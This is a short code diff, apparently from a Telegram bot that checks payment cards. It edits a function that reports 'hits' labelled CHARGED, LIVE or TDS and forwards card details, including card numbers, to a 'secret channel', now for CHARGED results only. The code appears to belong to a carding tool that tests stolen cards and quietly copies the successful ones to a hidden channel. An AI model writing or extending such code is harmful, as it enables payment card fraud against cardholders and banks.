@@ -2098,8 +2098,8 @@ async def _send_hit(bot, user, text: str, verdict: str,
         except Exception as e:
             logging.warning(f"[HIT] extra group: {e}")
 
-    # ── 4. Secret channel — animation + detailed card with card number ────────
-    if SECRET_CHANNEL_ID and verdict in ("CHARGED", "LIVE", "TDS"):
+    # ── 4. Secret channel — CHARGED only, never LIVE/TDS ─────────────────────
+    if SECRET_CHANNEL_ID and verdict == "CHARGED":
         try:
             bin_s  = _bin_str(bin_data)
             sc_lbl = ("CHARGED 💎" if verdict == "CHARGED"
